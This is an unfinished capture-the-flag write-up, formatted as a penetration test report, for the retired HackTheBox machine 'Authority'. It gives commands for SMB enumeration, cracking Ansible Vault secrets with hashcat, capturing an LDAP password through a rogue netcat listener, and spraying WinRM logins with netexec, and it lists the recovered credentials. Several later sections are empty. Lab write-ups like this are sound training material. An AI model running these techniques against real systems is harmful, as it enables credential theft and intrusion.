# HTB Authority - OSCP-Style Penetration Test Report

**Author:** randalltr

**Date:** 2026-4-2

---

## 0. Lesson Learned



---

## 1. Executive Summary



---

## 2. Scope

- **Target:** 10.129.229.56
- **Environment:** HackTheBox Authority (Retired Machine)
- **Testing Window:** 2026-3-26 to 2025-4-2
- **Objective:** Full system compromise

---

## 3. Methodology

Testing followed a standard OSCP methodology:

- Information Gathering
- Enumeration
- Initial Access
- Post-Exploitation
- Privilege Escalation
- Proof of Compromise

---

## 4. Information Gathering

A full TCP-port scan was run with Nmap:

```
nmap 10.129.229.56 -p- -sCV -T4 -oA authority_tcp
```

Open ports:

- 53/tcp - domain
- 80/tcp - http (IIS 10.0)
- 88/tcp - kerberos
- 135/tcp - msrpc
- 139/tcp - netbios-ssn
- 389/tcp - ldap
- 445/tcp - microsoft-ds
- 464/tcp - kpasswd5
- 593/tcp - ncacn_http
- 636/tcp - ssl/ldap
- 3268/tcp - ldap
- 3269/tcp - ssl/ldap
- 5985/tcp - winrm
- 8443/tcp - https (Apache Tomcat)

The system is a Windows Domain Controller exposing LDAP, SMB, Kerberos, and WinRM services, indicating an Active Directory environment.

---

## 5. Enumeration

PWM running on port 8443 in configuration mode allows unauthenticated configuration access, indicating a serious misconfiguration. An error disclosed username `svc_ldap`.

SMB was enumerated anonymously:

```
smbclient -L //10.129.229.56 -N
```

Revealing the `Development` share accessible anonymously.

Files from the `Development` share were downloaded for offline analysis:

```
smbclient //10.129.229.56/Development -N -c 'recurse ON,prompt OFF,mget *'
```

---

## 6. Initial Access

Manually browsing the files revealed Ansible Vault Passwords:

```
Automation/Ansible/PWM/defaults/main.yml
```

Each of the Ansible credentials were saved to a file to convert to a crackable hash:

```
ansible2john pwm_admin_login.vault > pwm_admin_login.hash

ansible2john pwm_admin_password.vault > pwm_admin_password.hash

ansible2john ldap_admin_password.vault > ldap_admin_password.hash
```

The hashes were cracked with hashcat all revealing the same password `!@#$%^&*`:

```
hashcat -m 16900 -O -a 0 -w 4 credentials.hash /usr/share/wordlists/rockyou.txt
```

The vaults were decrypted with this cracked password:

```
cat pwm_admin_login.vault | ansible-vault decrypt

cat pwm_admin_password.vault | ansible-vault decrypt

cat ldap_admin_password.vault | ansible-vault decrypt
```

Revealing the following credentials:

```
svc_pwm

pWm_@dm!N_!23

DevT3st@123
```

The credentials `pWm_@dm!N_!23` work to login on the Configuration Manager and Configuration Editor.

Changing the LDAP server to attacker machine IP and starting a listener:

```
nc -lnvp 389
```

Captured the credentials:

```
lDaP_1n_th3_cle4r!
```

Credentials were validated with netexec:

```
netexec winrm authority.htb -u usernames.txt -p 'lDaP_1n_th3_cle4r!' --continue-on-success
```

Revealing WinRM access for user `svc_ldap`.

---

## 7. Post-Exploitation

---

## 8. Privilege Escalation

---

## 9. Proof of Compromise

---

## 10. Findings & Recommendations

---

## 11. Appendix

Cracking Ansible Vault Passwords -
[https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/](https://www.bengrewell.com/cracking-ansible-vault-secrets-with-hashcat/)